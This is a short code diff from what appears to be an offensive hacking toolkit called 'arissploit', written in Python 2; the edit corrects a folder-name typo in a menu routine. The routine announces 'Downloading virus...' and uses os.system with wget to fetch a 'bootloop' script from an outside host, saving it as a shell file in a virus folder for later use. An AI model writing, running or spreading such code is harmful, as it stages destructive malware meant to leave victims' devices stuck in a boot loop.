@@ -443,7 +443,7 @@ def main():
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
 			time.sleep(1)
-			os.system("cd virus;mkdir bootlop;cd bootlop;wget http://zumizec-com.waper.co/files/bootloop.txt;mv bootloop.txt bootloop.sh")
+			os.system("cd virus;mkdir bootloop;cd bootloop;wget http://zumizec-com.waper.co/files/bootloop.txt;mv bootloop.txt bootloop.sh")
 		        print "Now check folder virus on "+R+"arissploit/virus/bootloop/"
 		        time.sleep(1)
 		        print (""+B+"[*]"+N+" Job finished..")
